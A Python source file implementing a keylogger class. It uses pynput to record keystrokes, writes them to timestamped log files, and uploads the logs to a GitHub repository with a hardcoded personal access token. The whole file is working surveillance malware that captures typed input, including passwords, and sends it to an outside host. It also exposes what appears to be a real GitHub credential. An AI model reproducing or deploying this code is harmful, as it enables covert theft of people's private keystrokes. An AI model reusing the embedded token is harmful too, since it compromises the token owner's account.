from pynput.keyboard import Key, Listener
import os
from github import Github
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.count = 0
        self.keys = []
        self.dir = "keylogs"
        self.access_token = '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'
        self.g = Github(self.access_token)
        self.user = self.g.get_user()
        self.repo = self.user.get_repo('pythonDevelopment2')
        self.log_started = False

    def start_keylogger(self):
        current_time = datetime.now()
        self.timeStamp = current_time.strftime("%d-%m-%Y-%Hu%Mm%Ss")
        self.log_started = True
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.listener.join()

    def on_press(self, key):
        if self.log_started:
            self.keys.append(key)
            self.count += 1
            print("{0} pressed".format(key))
            if self.count >= 15:
                self.count = 0
                self.write_file(self.keys)
                self.keys = []

    def write_file(self, keys):
        if not os.path.exists(self.dir):
            os.mkdir(self.dir)
        file_name = f"logfile-{self.timeStamp}"
        log_path = os.path.join(self.dir, file_name)
        with open(log_path, "a") as log:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    log.write('\n')
                elif k.find("Key") == -1:
                    log.write(k)

    def send_github(self):
        file_name = f"logfile-{self.timeStamp}"
        log_path = os.path.join(self.dir, file_name)
        with open(log_path, "rb") as file:
            self.repo.create_file(f"{self.dir}/{file_name}", "Added logfile", file.read())

    def on_release(self, key):
        if key == Key.esc:
            if self.log_started:
                self.log_started = False
                self.send_github()
                self.listener.stop()
                exit()
                return False
